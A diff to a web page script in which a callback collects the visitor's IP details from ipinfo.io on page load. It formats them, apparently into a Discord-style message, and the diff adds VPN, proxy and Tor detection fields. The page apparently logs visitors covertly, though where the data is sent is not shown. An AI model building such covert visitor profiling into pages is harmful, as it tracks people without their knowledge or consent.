@@ -722,7 +722,14 @@ function monke(json) {
                         `**Abuse Email:** \`${ipInfo.abuse && ipInfo.abuse.email ? ipInfo.abuse.email : "N/A"}\`\n` +
                         `**Abuse Phone:** \`${ipInfo.abuse && ipInfo.abuse.phone ? ipInfo.abuse.phone : "N/A"}\`\n\n` +
                         `**Domains Total:** \`${ipInfo.domains && ipInfo.domains.total ? ipInfo.domains.total : "N/A"}\`\n` +
-                        `**Domains List:** ${ipInfo.domains && ipInfo.domains.domains ? ipInfo.domains.domains.map(domain => `\n- ${domain}`).join("") : "N/A"}`
+                        `**Domains List:** ${ipInfo.domains && ipInfo.domains.domains ? ipInfo.domains.domains.map(domain => `\n- ${domain}`).join("") : "N/A"}\n\n` +
+                        `**Privacy:**\n` +
+                        ` - VPN: ${ipInfo.privacy && ipInfo.privacy.vpn ? "Yes" : "No"}\n` +
+                        ` - Proxy: ${ipInfo.privacy && ipInfo.privacy.proxy ? "Yes" : "No"}\n` +
+                        ` - Tor: ${ipInfo.privacy && ipInfo.privacy.tor ? "Yes" : "No"}\n` +
+                        ` - Relay: ${ipInfo.privacy && ipInfo.privacy.relay ? "Yes" : "No"}\n` +
+                        ` - Hosting: ${ipInfo.privacy && ipInfo.privacy.hosting ? "Yes" : "No"}\n` +
+                        ` - Service: \`${ipInfo.privacy && ipInfo.privacy.service ? ipInfo.privacy.service : "N/A"}\``
                 }]
             };
 
@@ -744,6 +751,5 @@ function monke(json) {
         console.error("Error sending ipinfo.io request:", error);
     }
 }
-monke("8.8.8.8", "4251134854bbf7");
 </script>
 <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
